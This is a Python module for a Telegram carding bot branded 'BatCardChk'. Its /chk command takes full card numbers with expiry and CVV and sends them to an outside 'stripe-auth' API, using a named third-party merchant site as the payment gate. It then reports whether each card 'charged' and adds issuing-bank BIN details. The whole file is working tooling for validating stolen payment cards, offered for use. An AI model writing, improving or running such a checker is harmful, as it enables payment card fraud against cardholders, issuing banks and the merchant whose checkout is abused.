import aiohttp
import asyncio
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import CommandHandler, ContextTypes
from bin import get_bin_info

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "https://stripe-auth-test-production.up.railway.app/st0"
SITE = "fashionspicex.com"
API_TIMEOUT = 180
GATE_NAME = "⚡ 𝐒𝐭𝐫𝐢𝐩𝐞"
OWNER_ID = 8283904645  # Your Telegram ID for /onchk and /offchk

BRAND_LINK = "https://t.me/+XyOiPrM60Og4MTU0" 
CHANNEL_NAME = "⚡ BatCardChk ⚡"  
CHANNEL_LINK = "https://t.me/Batmancardchk_bot" 
APPROVED_STICKER_ID = "" 
DECLINED_STICKER_ID = "" 

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 OWNER GATE CONTROLS 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def onchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    context.bot_data['chk_status'] = True
    await update.message.reply_text("🦇 <b>Stripe Gate is now ON.</b>", parse_mode="HTML")

async def offchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    context.bot_data['chk_status'] = False
    await update.message.reply_text("🦇 <b>Stripe Gate is now OFF.</b>", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 /chk COMMAND HANDLER (UPGRADED & FASTER) 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Check if gate is off
    if not context.bot_data.get('chk_status', True):
        await update.message.reply_text("🦇 <b>Stripe Gate is currently OFF.</b>\nOwner must use /onchk to enable.", parse_mode="HTML")
        return

    if not context.args:
        await update.message.reply_text("❌ <b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>", parse_mode="HTML")
        return

    card = context.args[0]
    
    # Faster processing message
    msg = await update.message.reply_text("🦇 <i>Scanning Gotham...</i>", parse_mode="HTML")

    try:
        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
        bin_num = card[:6]

        # 🚀 SPEED UPGRADE: Fetch API and BIN info AT THE SAME TIME
        async with aiohttp.ClientSession(timeout=timeout) as session:
            api_task = session.get(API_URL, params={"cc": card, "site": SITE})
            bin_task = get_bin_info(bin_num)
            
            # Run both concurrently for double speed
            api_resp, bin_info = await asyncio.gather(api_task, bin_task, return_exceptions=True)

        # Process API Response
        if isinstance(api_resp, Exception): raise api_resp
        data = await api_resp.json()
        api_response = data.get("response", "Unknown response")

        # Process BIN Response
        if isinstance(bin_info, Exception): bin_info = {}

        status = "Cʜᴀʀɢᴇᴅ 💎" if "approved" in api_response.lower() else "Dᴇᴄʟɪɴᴇᴅ ❌"
        
        if status == "Cʜᴀʀɢᴇᴅ 💎" and APPROVED_STICKER_ID:
            await update.message.reply_sticker(APPROVED_STICKER_ID)
        elif status == "Dᴇᴄʟɪɴᴇᴅ ❌" and DECLINED_STICKER_ID:
            await update.message.reply_sticker(DECLINED_STICKER_ID)

        # Format BIN
        bin_text = "N/A"
        if not bin_info.get("error"):
            scheme = str(bin_info.get("scheme", "N/A")).upper()
            btype = str(bin_info.get("type", "N/A")).upper()
            bank = bin_info.get("bank", "N/A")
            country = str(bin_info.get("country", "N/A")).upper()
            emoji = bin_info.get("country_emoji", "")
            bin_text = f"{scheme} - {btype} - {bank} {emoji} {country}"

        user_display = f"{user.first_name} 🦇 (Cᴏʀᴇ)"

        # 🦇 PREMIUM BATMAN UI 🦇
        result_text = (
            f"<a href='{BRAND_LINK}'>🦇 𝐁𝐀𝐓𝐌𝐀𝐍</a> ➛ {status}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 ➛ <code>{card}</code>\n"
            f"🏦 ➛ {bin_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌃 𝐆𝐚𝐭𝐞 ➛ {GATE_NAME}\n"
            f"📜 𝐑𝐚𝐰  ➛ {api_response}\n"
            f"🦇 𝐔ꜱᴇʀ ➛ {user_display}"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(CHANNEL_NAME, url=CHANNEL_LINK)]
        ])

        await msg.edit_text(result_text, parse_mode="HTML", reply_markup=keyboard)

    except aiohttp.ClientTimeout:
        await msg.edit_text("🦇 <b>Error:</b> API request timed out.", parse_mode="HTML")
    except Exception as e:
        await msg.edit_text(f"🦇 <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 EXPORT HANDLERS 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_chk_handlers():
    return [
        CommandHandler("chk", chk),
        CommandHandler("onchk", onchk),
        CommandHandler("offchk", offchk)
    ]
